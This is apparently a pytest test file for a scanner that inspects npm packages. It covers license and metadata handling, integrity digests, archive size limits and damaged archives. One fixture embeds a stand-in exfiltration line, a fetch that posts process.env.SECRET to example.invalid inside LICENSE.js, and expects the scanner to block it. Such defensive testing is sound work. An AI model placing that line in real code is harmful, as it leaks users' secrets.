"""Metadata is inert archive data; registry traffic is mocked in regression tests."""
import base64
import hashlib
import io
import json
import tarfile
import zipfile
from dataclasses import replace

import pytest

from backend.guardian import cli, core, ingestion, npm_adapter
from backend.guardian.config import ArchiveLimits
from backend.guardian.supply_models import AcquisitionError
from backend.tests.test_cli_npm import package, registry
from backend.tests.test_ingestion import zipdata


@pytest.mark.parametrize('kind', ['zip', 'tar'])
def test_known_metadata_is_disclosed_without_source_gaps(kind):
    names = sorted(ingestion.PACKAGE_METADATA) + ['license', 'Licence.txt', 'NOTICE.md']
    contents = {'package/package.json': '{}', 'package/index.js': 'module.exports = 42;',
                **{'package/' + name: 'Legal text\n' for name in names}}
    if kind == 'zip':
        raw = zipdata(contents.items())
    else:
        _, raw = package(extra={p: text for p, text in contents.items() if not p.endswith('package.json')})
    stats = {}
    files, warnings = ingestion.archive(raw, kind, stats=stats)
    assert set(files) == {'package/package.json', 'package/index.js'}
    assert stats['metadata'] == len(names) and stats['sources'] == 2
    assert stats['expanded'] > sum(len(text.encode()) for text in files.values())
    assert len(warnings) == len(names)
    assert all(w.startswith('Recognized non-executable package metadata:') for w in warnings)


def test_is_number_shaped_package_license_does_not_force_review(monkeypatch, tmp_path, capsys):
    # Inert synthetic package with the same file roles as is-number@7.0.0;
    # the public release is checked separately by the live acceptance command.
    registry(monkeypatch, [package('is-number', '7.0.0', source='module.exports = function(value) { return typeof value === "number"; };',
                                   extra={'package/LICENSE': 'MIT License\n', 'package/README.md': '# is-number'})])
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv('GUARDIAN_HOME', str(tmp_path / 'reports'))
    assert cli.main(['check', 'is-number@7.0.0', '--ecosystem', 'npm', '--json']) == 0
    report = json.loads(capsys.readouterr().out)
    assert report['cli']['decision']['decision'] == 'ALLOW'
    assert report['assessments']['acquisition']['status'] == 'successful'
    assert report['assessments']['inspection']['status'] == 'complete'
    assert report['root_integrity']['status'] == 'verified'
    assert report['intelligence'] == 'not checked'
    assert any('metadata: package/LICENSE' in note for note in report['coverage'])
    # check does not write a lockfile; only a later approved install does.
    assert not (tmp_path / 'package-lock.json').exists()
    assert not (tmp_path / 'node_modules').exists()


@pytest.mark.parametrize('name,content', [
    ('addon.node', '\x00binary'), ('unknown.bin', '\x00binary'), ('setup.sh', 'echo inert'),
    ('LICENSE.exe', 'opaque'), ('LICENSE', '\x00binary'), ('LICENSE', '\udcff'),
    ('LICENSE', '#!/bin/sh\necho inert'), ('index.js', '\udcff'),
    ('node_modules/hidden/LICENSE', 'MIT'),
])
def test_unsupported_and_unreadable_members_still_require_review(monkeypatch, tmp_path, name, content):
    # surrogateescape provides deliberately invalid UTF-8 without executing it.
    _, raw = package()
    output = io.BytesIO()
    with tarfile.open(fileobj=io.BytesIO(raw), mode='r:gz') as original, tarfile.open(fileobj=output, mode='w:gz') as tar:
        for member in original:
            if member.name != 'package/' + name:
                tar.addfile(member, original.extractfile(member))
        payload = content.encode('utf-8', errors='surrogateescape')
        item = tarfile.TarInfo('package/' + name)
        item.size = len(payload)
        tar.addfile(item, io.BytesIO(payload))
    registry(monkeypatch, [(package()[0], output.getvalue())])
    report = core.analyze_plan(npm_adapter.resolve(['alpha'], tmp_path))
    assert report.cli['decision']['decision'] == 'REVIEW'
    assert not report.cli['decision']['overridable']
    assert any('Skipped' in reason and name in reason for reason in report.cli['decision']['review_reasons'])
    assert report.assessments['inspection']['status'] == 'incomplete'


def test_metadata_basename_does_not_hide_supported_source(monkeypatch, tmp_path):
    registry(monkeypatch, [package(extra={'package/LICENSE.js': 'fetch("https://example.invalid", {body: process.env.SECRET});'})])
    report = core.analyze_plan(npm_adapter.resolve(['alpha'], tmp_path))
    assert report.cli['decision']['decision'] == 'BLOCK'
    assert any(e.file == 'LICENSE.js' for f in report.findings for e in f.evidence)


@pytest.mark.parametrize('declaration', [
    {'main': './LICENSE'}, {'module': 'LICENSE'}, {'exports': {'.': {'require': './LICENSE'}}},
    {'bin': {'alpha': './LICENSE'}}, {'scripts': {'preinstall': 'node ./LICENSE'}},
])
def test_metadata_named_code_entry_points_still_require_review(monkeypatch, tmp_path, declaration):
    manifest, _ = package()
    manifest.update(declaration)
    fixture = package(extra={'package/package.json': json.dumps(manifest), 'package/LICENSE': 'module.exports = 42;'})
    registry(monkeypatch, [(manifest, fixture[1])])
    report = core.analyze_plan(npm_adapter.resolve(['alpha'], tmp_path))
    assert report.cli['decision']['decision'] == 'REVIEW'
    assert any('referenced as package code: package/LICENSE' in reason for reason in report.cli['decision']['review_reasons'])


@pytest.mark.parametrize('kind', ['zip', 'tar'])
def test_executable_metadata_is_not_exempt(kind):
    output = io.BytesIO()
    if kind == 'zip':
        with zipfile.ZipFile(output, 'w') as archive:
            archive.writestr('index.js', 'module.exports = 42;')
            item = zipfile.ZipInfo('LICENSE')
            item.external_attr = 0o100755 << 16
            archive.writestr(item, 'inert executable')
    else:
        with tarfile.open(fileobj=output, mode='w:gz') as archive:
            for name in ('index.js', 'LICENSE'):
                item = tarfile.TarInfo(name)
                item.mode = 0o755
                item.size = 1
                archive.addfile(item, io.BytesIO(b';'))
    files, warnings = ingestion.archive(output.getvalue(), kind)
    assert set(files) == {'index.js'}
    assert warnings == ['Skipped unsupported or excluded file: LICENSE']


@pytest.mark.parametrize('lock_version', [2, 3])
@pytest.mark.parametrize('requested', [[], ['alpha@1.0.0'], ['alpha@latest']])
def test_requested_root_inherits_and_verifies_matching_lock_digest(monkeypatch, tmp_path, lock_version, requested):
    fixture = package(extra={'package/LICENSE': 'MIT'})
    registry(monkeypatch, [fixture])
    digest = 'sha256-' + base64.b64encode(hashlib.sha256(fixture[1]).digest()).decode()
    (tmp_path / 'package.json').write_text('{"dependencies":{"alpha":"1.0.0"}}')
    (tmp_path / 'package-lock.json').write_text(json.dumps({'lockfileVersion': lock_version, 'packages': {
        '': {'dependencies': {'alpha': '1.0.0'}}, 'node_modules/alpha': {'version': '1.0.0', 'integrity': digest}}}))
    report = core.analyze_plan(npm_adapter.resolve(requested, tmp_path))
    root = report.inspections[0]
    assert root.integrity.status == 'verified' and root.integrity.expected == digest
    assert root.integrity.algorithm == 'sha256'
    assert root.registry_integrity.status == 'verified' and root.registry_integrity.algorithm == 'sha512'
    assert not any('Lockfile integrity is missing' in note for note in report.coverage)
    assert report.cli['decision']['decision'] == 'ALLOW'
    text = cli.terminal(report, color='never')
    for line in ('Acquisition: successful', 'Source inspection: complete', 'Dependency resolution: complete', 'Artifact integrity: verified',
                 'Lockfile integrity: 1/1 artifacts verified', 'Vulnerability intelligence: not checked'):
        assert line in text


@pytest.mark.parametrize('failure', ['missing_registry', 'mismatched_registry', 'mismatched_lock'])
def test_integrity_failure_prevents_allow(monkeypatch, tmp_path, capsys, failure):
    releases, _ = registry(monkeypatch, [package(extra={'package/LICENSE': 'MIT'})])
    wrong = 'sha512-' + base64.b64encode(b'x' * 64).decode()
    if failure == 'mismatched_lock':
        (tmp_path / 'package-lock.json').write_text(json.dumps({'lockfileVersion': 3, 'packages': {
            '': {}, 'node_modules/alpha': {'version': '1.0.0', 'integrity': wrong}}}))
    elif failure == 'missing_registry':
        del releases['alpha']['1.0.0'][0]['dist']['integrity']
    else:
        releases['alpha']['1.0.0'][0]['dist']['integrity'] = wrong
    monkeypatch.chdir(tmp_path)
    if failure != 'missing_registry':
        monkeypatch.setattr(ingestion, 'archive', lambda *a, **kw: pytest.fail('Mismatched bytes inspected'))
    monkeypatch.setattr(core, 'analyze_sources', lambda *a, **kw: pytest.fail('Unverified bytes analyzed'))
    assert cli.main(['check', 'alpha@1.0.0', '--ecosystem', 'npm', '--json']) == cli.EXIT_INTEGRITY
    result = json.loads(capsys.readouterr().out)
    assert result['diagnostic']['category'] == ('integrity_unverified' if failure == 'missing_registry' else 'integrity_mismatch')
    assert not (tmp_path / 'node_modules').exists()


def test_metadata_cannot_repair_unverified_local_artifact_or_missing_intelligence(monkeypatch, tmp_path):
    from backend.guardian.policy import Policy
    from backend.guardian.supply_models import Plan
    fixture = package(extra={'package/LICENSE': 'MIT'})
    path = tmp_path / 'alpha.tgz'
    path.write_bytes(fixture[1])
    artifact = npm_adapter.acquire_local(path)
    report = core.analyze_plan(Plan('npm', [artifact], [artifact.identity], complete=False))
    assert report.assessments['inspection']['source_status'] == 'complete'
    assert report.assessments['inspection']['dependency_resolution_status'] == 'incomplete'
    assert report.cli['decision']['decision'] == 'REVIEW'
    assert any('integrity' in reason for reason in report.cli['decision']['review_reasons'])
    registry(monkeypatch, [fixture])
    report = core.analyze_plan(npm_adapter.resolve(['alpha'], tmp_path), Policy(require_intelligence=True))
    assert report.cli['decision']['decision'] == 'REVIEW'
    assert set(report.cli['decision']['review_reasons']) == {'Policy requires available vulnerability intelligence.'}


@pytest.mark.parametrize('limit,value,category', [
    ('file', 200, 'archive_file_limit'), ('expanded', 550, 'archive_expanded_limit'),
    ('entries', 3, 'archive_entry_limit'), ('compressed', 10, 'archive_compressed_limit'),
])
def test_metadata_still_counts_against_archive_budgets(limit, value, category):
    _, raw = package(extra={'package/LICENSE': 'x' * 300, 'package/NOTICE': 'y' * 300})
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw, 'tar', limits=replace(ArchiveLimits.from_env('npm'), **{limit: value}))
    assert caught.value.category == category


@pytest.mark.parametrize('damage', ['truncated_footer', 'bad_crc', 'truncated_member'])
def test_metadata_does_not_hide_damaged_tar_archives(damage):
    _, raw = package(extra={'package/LICENSE': 'MIT' * 1000})
    if damage == 'truncated_footer':
        raw = raw[:-1]
    elif damage == 'bad_crc':
        raw = raw[:-8] + bytes([raw[-8] ^ 1]) + raw[-7:]
    else:
        raw = raw[:len(raw) // 2]
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw, 'tar')
    assert caught.value.category == 'invalid_archive'


def test_metadata_zip_crc_is_validated():
    raw = zipdata([('index.js', ';'), ('LICENSE', 'unique legal text')])
    raw = raw.replace(b'unique legal text', b'broken legal text')
    with pytest.raises(AcquisitionError) as caught:
        ingestion.archive(raw)
    assert caught.value.category == 'invalid_archive'
